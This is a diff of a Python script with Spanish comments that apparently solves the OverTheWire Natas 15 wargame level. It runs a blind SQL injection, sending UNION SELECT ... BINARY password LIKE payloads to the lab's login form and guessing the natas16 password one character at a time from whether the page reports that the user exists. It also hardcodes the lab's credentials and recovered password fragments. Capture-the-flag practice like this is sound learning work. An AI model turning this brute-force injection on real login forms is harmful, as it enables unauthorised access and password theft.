@@ -44,9 +44,9 @@ def obtener_nombres(username,password,session,url):
                 print(f"encontramos con {characters[contador]}")
                 user_to_find +=characters[contador]
                 contador=0
-
             contador+=1
     print(f"los usuarios son {full_name}")
+    return full_name
 
 #password alice  hrotsfm734
 #caminos de pass ['t', 'h', '6', 'T', 'H']
@@ -54,14 +54,15 @@ def obtener_nombres(username,password,session,url):
 def obtener_password(username,password,session,url):
     characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
     contador = 0
-    newpassword = 'TRD7iZrd5gATjj9PkPEuaOlfEjH'
+    #hROtsfM734 HLwuGKts2w
+    newpassword = 'hP'
     while True:
         if contador == len(characters)-1:
             break
         print(f"intentando con {newpassword}{characters[contador]}")
         test = newpassword+ characters[contador]
         #payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%" }
-        payload = {'username': "LIKE"+test+"%" }
+        payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%\" AND username = \"natas16" }
         r= session.post(url,auth=(username, password),data=payload)
         #print(r.content)
         if b"This user exist" in r.content:
@@ -76,14 +77,14 @@ def obtener_password(username,password,session,url):
 def obtener_password2(username,password,session,url):
     characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
     contador = 0
-    newpassword = '' #caminos con t [r y R], caminos con T []
+    newpassword = 'hP' #inicio h---[R P], 6 ,H
     l=[]
     while True:
         if contador == len(characters)-1:
             break
         print(f"intentando con {newpassword}{characters[contador]}")
         test = newpassword+ characters[contador]
-        payload = {'username': "natas16\" AND password LIKE \""+test+"%" }
+        payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%\" AND username = \"natas16" }
         r= session.post(url,auth=(username, password),data=payload)
         if b"This user exist" in r.content:
             print(f"encontramos con {characters[contador]}")
@@ -98,6 +99,7 @@ if __name__ == "__main__" :
     username = "natas15"
     password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
     url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
+    #['ñatas16', 'alice', 'charlie', 'bob', 'natas16', 'Ñatas16', 'Alice', 'Charlie', 'Bob', 'Natas16']
     session= iniciar_sesion(username,password,url)
-    obtener_nombres(username,password,session,url)
-    #obtener_password(username,password,session,url)
+    #names = obtener_nombres(username,password,session,url)
+    obtener_password(username,password,session,url)
